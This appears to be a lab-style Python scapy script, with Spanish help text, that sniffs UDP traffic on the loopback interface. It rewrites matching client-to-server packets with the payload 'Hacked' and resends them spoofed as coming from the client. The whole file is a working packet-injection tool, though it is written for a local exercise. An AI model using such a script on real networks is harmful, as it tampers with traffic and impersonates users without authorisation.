import argparse
from scapy.all import *


def hack_client(
    client_ip: str, client_port: int, server_ip: str, server_port: int
) -> None:
    """
    Function that hacks the client by intercepting and modifying UDP packets
    """

    def packet_handler(packet):
        if IP in packet and UDP in packet:
            # print("intercepted packet in ip and udp")
            # print("PACKET INFO:")
            # print(
            #     f"{packet[IP].src}:{packet[UDP].sport} -> {packet[IP].dst}:{packet[UDP].dport}"
            # )
            # print("should match:")
            # print(f"{client_ip}:{client_port} -> {server_ip}:{server_port}")

            # print("packet details:")
            # print(packet.show())
            # print()
            # print(packet.layers())
            # print("\n\n")
            if (
                packet[IP].src == client_ip
                and packet[IP].dst == server_ip
                and packet[UDP].sport == client_port
                and packet[UDP].dport == server_port
            ):
                print("packet is from client to server")
                modified_packet = packet.copy()
                if Raw in modified_packet:
                    modified_packet[Raw].load = b"Hacked"
                else:
                    modified_packet = modified_packet / Raw(load=b"Hacked")

                print(f"Packet intercepted: {packet[Raw].load}")
                print(f"Packet modified: {modified_packet[Raw].load}")

                del modified_packet[IP].chksum
                del modified_packet[UDP].chksum

                send(modified_packet, verbose=0)

    sniff(
        filter=f"udp",
        prn=packet_handler,
        # store=0,
        iface="lo"
    )


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Pirata para inyectar paquetes UDP a un servidor"
        "para que crea que son del cliente"
    )

    parser.add_argument(
        "--client-ip",
        type=str,
        default="127.0.0.1",
        help="IP del cliente a hackear",
    )
    parser.add_argument(
        "--client-port",
        type=int,
        default="1818",
        help="Puerto del cliente a hackear",
    )
    parser.add_argument(
        "--server-ip",
        type=str,
        default="127.0.0.1",
        help="IP del servidor",
    )
    parser.add_argument(
        "--server-port",
        type=int,
        default="1818",
        help="Puerto del servidor",
    )

    args = parser.parse_args()
    print("Available interfaces:")
    interfaces = scapy.arch.get_if_list()
    print(interfaces)

    print(f"Cliente a hackear: {args.client_ip}:{args.client_port}")
    print(f"Servidor: {args.server_ip}:{args.server_port}")

    conf.L3socket = L3RawSocket

    hack_client(
        # packet="Hackeado",
        client_ip=args.client_ip,
        client_port=args.client_port,
        server_ip=args.server_ip,
        server_port=args.server_port,
    )
